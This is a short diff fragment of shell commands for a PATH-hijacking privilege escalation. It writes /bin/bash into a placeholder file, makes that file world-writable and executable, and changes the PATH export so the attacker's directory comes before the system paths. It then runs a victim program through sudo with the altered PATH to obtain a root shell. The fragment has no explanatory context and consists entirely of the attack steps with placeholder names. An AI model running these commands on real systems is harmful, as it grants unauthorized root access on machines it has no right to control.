@@ -2,7 +2,7 @@
 
 echo /bin/bash > <EVIL>
 chmod 777 <EVIL>
-export PATH=$PATH:/<EVIL_PATH>
+export PATH=:/<EVIL_PATH>:$PATH
 
 ### ...
 sudo PATH=$PATH /<VICTIM_PATH>
